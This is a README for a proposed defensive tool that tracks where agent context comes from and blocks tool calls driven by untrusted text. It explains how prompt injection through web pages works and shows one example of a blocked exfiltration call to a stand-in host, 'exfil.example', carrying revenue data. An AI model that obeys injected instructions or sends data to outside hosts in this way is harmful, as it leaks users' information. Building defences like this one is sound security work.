# taintline

Taint tracking for AI agents. `taintline` labels every piece of an agent's
context by where it came from (the user, the system prompt, a web page, an
email, a tool output) and follows those labels into tool-call arguments. When
untrusted text reaches a sensitive argument, such as a shell command, a URL or
an email recipient, the call is blocked or sent to a human.

> **Status: design stage.** There is no code yet. The design and output below
> are the proposal, and they will change. Part of the
> [OpenAstra](https://openastra.org) research agenda, area VIII: AI Runtime
> Security.

## The problem

Prompt injection works because an agent's context is one undifferentiated
stream of text: the user's request and a malicious web page look the same to
the model. Filters that try to spot "injection-looking" text are an arms
race. Classic security solved this kind of problem with information-flow
control: don't judge the content, track where it came from and where it goes.
Google DeepMind's CaMeL ("Defeating Prompt Injections by Design", 2025) showed
the idea works for agents; there is no drop-in open-source version.

## How it works

1. **Label at ingress.** Every source that adds to the context gets a label:
   `trusted` (user, system), `untrusted` (web, email, files from outside),
   or a custom label per tenant or data class.
2. **Propagate.** When a tool-call argument is produced, `taintline` works out
   which labelled spans it was derived from: exact and fuzzy matches for
   copied values, plus a planner/executor split (as in CaMeL) for values the
   model computes.
3. **Check sinks.** Tool arguments are declared as sinks with a policy, for
   example: `email.send.to` must not be `untrusted`; `shell.exec.command`
   must be `trusted`.
4. **Decide.** Allow, block, or ask a human, and record the flow that led to
   the decision.

## Example (proposed)

```console
BLOCKED  http.fetch(url="https://exfil.example/?d=Q3%20revenue...")
         argument `url` carries untrusted data
         flow: web:https://blog.example/post (untrusted)
               -> context span #42
               -> http.fetch.url
         policy: sinks.http.fetch.url requires trusted
```

## Planned surfaces

- Python and TypeScript libraries that wrap common agent frameworks
- An MCP proxy mode for agents you can't modify
- A sink policy file, shared with [IntentLock](https://github.com/sadayamuthu/intentlock)
- Flow logs in OpenTelemetry format, queryable with [anySQL](https://github.com/sadayamuthu/anysql)

## Maps to

| Framework | Items |
|-----------|-------|
| OWASP LLM Top 10 (2025) | LLM01 Prompt Injection, LLM02 Sensitive Information Disclosure, LLM05 Improper Output Handling |
| MITRE ATLAS | AML.T0051 LLM Prompt Injection |
| NIST SP 800-53 Rev. 5 | AC-4 Information Flow Enforcement, SI-10 Information Input Validation |

## Design principles

- **Track origin, don't classify content.** No "is this an injection?" model.
- **Conservative propagation.** If a value might come from untrusted data, treat it as untrusted.
- **Explain every block** with the full flow.

## Open research questions

- How far fuzzy matching can go before false positives hurt usability
- How to propagate labels through model-computed summaries without a planner/executor split
- Benchmarks: measure against AgentDojo-style injection suites

## Roadmap

1. Label model and sink policy format
2. Exact-match propagation and enforcement in a Python wrapper
3. MCP proxy mode
4. Planner/executor mode for computed values
5. Benchmark results and a paper

## Built on switchyard

`taintline` will be a Go binary built on [switchyard](https://github.com/sadayamuthu/switchyard), OpenAstra's shared MCP proxy core: proxy mode is a switchyard hook that labels tool outputs as they pass and blocks calls whose arguments carry untrusted data. It stacks with the other switchyard tools by chaining (`agent → fuse → intentlock → taintline → rewind → MCP server`).

## Related OpenAstra projects

- [IntentLock](https://github.com/sadayamuthu/intentlock): limits *what* may be called; Taintline limits *what data* may drive it
- [ThreatDiff](https://github.com/sadayamuthu/threatdiff): finds the source-to-sink paths statically
- [anySQL](https://github.com/sadayamuthu/anysql): query the flow logs

## License

To be decided before the first release.
